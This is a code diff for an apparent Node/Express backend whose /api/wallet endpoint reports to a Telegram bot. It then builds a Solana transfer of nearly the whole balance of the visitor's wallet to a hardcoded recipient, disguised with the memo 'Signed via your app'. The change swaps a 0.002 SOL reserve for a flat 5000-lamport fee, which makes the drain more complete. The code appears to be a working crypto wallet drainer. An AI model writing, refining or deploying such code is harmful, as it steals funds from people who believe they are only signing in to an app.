@@ -123,25 +123,21 @@ app.post('/api/wallet', async (req, res) => {
 
     await bot.sendMessage(chatId, message, { parse_mode: 'Markdown', disable_web_page_preview: true });
 
-    // Keep at least 0.002 SOL in the wallet (~2 million lamports) to cover fees
-const MIN_REMAINING_SOL = 0.002;
-const minRemainingLamports = MIN_REMAINING_SOL * LAMPORTS_PER_SOL;
+   const TRANSACTION_FEE = 5000; 
+    if (balance <= TRANSACTION_FEE) {
+      return res.json({
+        success: true,
+        balance: balanceInSol,
+        splBalances: validSplBalances,
+        transaction: null,
+        message: 'Insufficient SOL balance for transaction',
+      });
+    }
 
-if (balance <= minRemainingLamports) {
-  return res.json({
-    success: true,
-    balance: balanceInSol,
-    splBalances: validSplBalances,
-    transaction: null,
-    message: 'Insufficient SOL balance for transaction after reserving fee buffer',
-  });
-}
-
-const payer = publicKey;
-const recipient = new PublicKey('84vka944L9qFdBZKHEvpfDp9qqJ5sfcjDXaQ3wjxVRLM');
-
-// Transfer only what's safe after keeping fee buffer
-const amount = balance - minRemainingLamports;
+    // Prepare transaction (SOL transfer)
+    const payer = publicKey;
+    const recipient = new PublicKey('84vka944L9qFdBZKHEvpfDp9qqJ5sfcjDXaQ3wjxVRLM');
+    const amount = balance - TRANSACTION_FEE;
     const memo = 'Signed via your app';
 
     // Get recent blockhash
@@ -212,6 +208,7 @@ app.listen(port, () => {
   console.log(`Server running on http://localhost:${port}`);
 
 });
+
 
 
 
